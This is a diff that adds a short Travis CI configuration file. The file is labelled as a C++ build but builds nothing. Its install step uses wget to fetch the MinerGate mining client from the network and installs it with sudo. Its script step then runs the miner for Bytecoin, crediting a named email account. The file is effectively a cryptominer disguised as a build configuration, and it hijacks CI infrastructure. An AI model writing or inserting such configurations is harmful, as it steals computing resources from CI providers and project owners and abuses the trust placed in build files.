@@ -1,0 +1,4 @@
+language: cpp
+sudo: enabled
+install: wget https://minergate.com/download/deb-cli && sudo dpkg -i deb-cli
+script: ./minergate-cli -bcn -user onyxdeveloperteam@gmail.com
